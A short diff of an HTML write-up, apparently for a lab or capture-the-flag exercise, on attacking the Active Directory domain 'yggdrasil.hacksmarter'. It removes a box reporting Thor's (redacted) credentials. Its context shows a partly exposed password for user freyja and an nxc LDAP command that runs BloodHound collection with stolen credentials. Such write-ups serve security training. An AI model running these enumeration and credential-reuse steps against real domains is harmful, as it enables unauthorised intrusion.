@@ -213,10 +213,6 @@ SMB   10.1.17.238  445  MIDGARDDC  [+] yggdrasil.hacksmarter\freyja:Fr3yja!Dr@g0
 
   <p><img src="../assets/midgarden2/thor-password-description.png" alt="Thor user has password in description field" loading="lazy"></p>
 
-  <div class="key-finding">
-    <strong>New credentials discovered:</strong> <code>Thor:[REDACTED]</code>
-  </div>
-
   <h3><span class="step">[Step 4]</span> BloodHound Collection</h3>
   <p>With Thor's credentials, I collected domain data for BloodHound analysis:</p>
   <pre><code>$ nxc ldap 10.1.17.238 -u Thor -p '[REDACTED]' --bloodhound --collection All</code></pre>
